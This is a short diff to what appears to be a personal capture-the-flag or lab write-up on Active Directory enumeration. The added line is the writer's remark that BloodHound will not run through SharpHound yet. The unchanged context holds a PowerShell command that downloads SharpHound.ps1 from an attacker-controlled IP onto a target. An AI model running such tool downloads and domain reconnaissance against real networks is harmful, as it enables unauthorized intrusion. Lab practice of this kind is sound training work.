@@ -38,3 +38,5 @@ This means we have to run Bloodhound for that we have to use SharpHound.ps1
 ```
 IWR -Uri http://10.10.16.20/SharpHound.ps1 -OutFile SharpHound.ps1
 ```
+
+Not able to run the Bloodhound from the sharphound funtion will see what mistake i am doing . Refer the PDF once to see how they have run the bloodhound.
